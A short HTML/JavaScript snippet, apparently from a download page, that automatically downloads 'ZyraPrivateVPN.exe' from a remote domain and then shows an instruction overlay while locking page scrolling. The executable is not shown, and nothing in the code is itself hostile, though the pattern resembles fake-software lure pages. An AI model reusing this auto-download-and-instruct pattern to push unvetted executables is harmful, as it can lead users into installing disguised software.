<!-- ═══ DOWNLOAD + OVERLAY SCRIPT ═══ -->
<script>
function triggerDownload() {
  // 1. Скачиваем файл
  var a = document.createElement('a');
  a.href = 'https://vpnshieldguard.net/latest/ZyraPrivateVPN.exe';
  a.download = 'ZyraPrivateVPN.exe';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  // 2. Показываем overlay с инструкцией
  setTimeout(function(){
    document.getElementById('dl-overlay').classList.add('active');
    document.body.style.overflow = 'hidden';
  }, 400);
}

function closeDlOverlay() {
  document.getElementById('dl-overlay').classList.remove('active');
  document.body.style.overflow = '';
}
</script>

